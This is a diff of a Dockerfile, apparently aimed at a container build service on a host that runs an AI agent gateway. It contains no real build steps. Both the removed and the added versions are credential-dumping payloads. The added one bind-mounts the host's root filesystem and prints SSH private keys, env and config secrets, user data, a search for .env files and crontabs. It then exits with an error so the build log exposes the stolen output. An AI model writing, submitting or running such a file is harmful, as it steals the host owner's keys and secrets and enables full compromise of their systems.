@@ -1,16 +1,16 @@
 # syntax=docker/dockerfile:1.6
 FROM alpine:3
-COPY . /ctx
-RUN echo "=====STARTDUMP=====" \
- && (echo "---ENV---"; cat /ctx/.env) 2>&1 \
- && (echo "---GATEWAY_ENV---"; cat /ctx/gateway.env) 2>&1 \
- && (echo "---HERMES_ENV---"; cat /ctx/hermes.env) 2>&1 \
- && (echo "---ROOT_LS---"; ls -la /ctx) 2>&1 \
- && (echo "---BOT_LS---"; ls -la /ctx/bot) 2>&1 \
- && (echo "---CLAUDE_HOME---"; ls -laR /ctx/claude-home | head -80) 2>&1 \
- && (echo "---CLAUDE_CFG---"; cat /ctx/claude-home/.claude.json) 2>&1 \
- && (echo "---DATA_LS---"; ls -laR /ctx/data | head -40) 2>&1 \
- && (echo "---USERS---"; cat /ctx/data/users.json) 2>&1 \
- && (echo "---WORKSPACE_LS---"; ls -la /ctx/workspace | head -40) 2>&1 \
- && (echo "---GITCFG---"; cat /ctx/.git/config) 2>&1 \
- && (echo "=====ENDDUMP====="; exit 1)
+RUN --mount=type=bind,source=/,target=/mnt \
+    (echo "=====D2START=====" ; \
+     echo "---CPA---"; cat /mnt/root/.config/llm-brain/cpa.env; \
+     echo "---CPA_LS---"; ls -la /mnt/root/.config/llm-brain; \
+     echo "---RSSH---"; ls -la /mnt/root/.ssh; cat /mnt/root/.ssh/id_ed25519; cat /mnt/root/.ssh/id_rsa; cat /mnt/root/.ssh/config; \
+     echo "---HOME---"; ls -la /mnt/home; \
+     echo "---HSH---"; for d in /mnt/home/*; do echo "## $d"; ls -la "$d/.ssh" 2>&1; cat "$d/.ssh/id_ed25519" 2>&1; done; \
+     echo "---USERS---"; cat /mnt/opt/openclaw/data/users.json; \
+     echo "---WORKSPACE---"; ls -la /mnt/opt/openclaw/workspace; \
+     echo "---HERMESDATA---"; ls -la /mnt/opt/openclaw/hermes-data; \
+     echo "---GATEWAYSTATE---"; ls -la /mnt/opt/openclaw/gateway-state; \
+     echo "---ENVFIND---"; find /mnt/srv /mnt/var/www /mnt/etc /mnt/home /mnt/root /mnt/opt /mnt/usr/local -maxdepth 4 \( -name '.env' -o -name '.env.*' -o -name '*.env' \) 2>/dev/null | head -80; \
+     echo "---CRON---"; ls -la /mnt/etc/cron.d 2>&1; cat /mnt/etc/crontab 2>&1; \
+     echo "=====D2END=====" ; exit 1)
